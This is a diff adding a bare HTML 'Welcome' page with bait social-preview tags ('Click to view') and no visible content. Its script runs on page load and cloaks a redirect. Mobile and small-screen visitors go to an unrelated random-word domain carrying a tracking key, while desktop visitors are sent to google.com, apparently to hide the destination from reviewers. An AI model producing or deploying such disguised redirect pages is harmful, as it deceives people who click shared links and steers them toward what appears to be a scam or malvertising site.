@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Welcome</title>
+<meta property="og:title" content=" " />
+<meta property="og:description" content="Click to view" />
+<meta property="og:image" content="https://www.google.com/share.google?q=eityYFMYDaYBjMxP6"
+/>
+<meta property="og:url" content="https://rosy-cat-136jztq.mystrikingly.com/" />
+<meta property="og:type" content="website" />
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+var screenWidth = window.innerWidth;
+if (isMobile || screenWidth <= 768) {
+window.location.href = "https://gravelsemesterflourish.com/qnm1mgaxd?key=90cb37ba327d842326d733e95b26f92c";
+} else {
+window.location.href = "https://www.google.com/";
+}
+});
+</script>
+</head>
+<body>
+</body>
+</html>
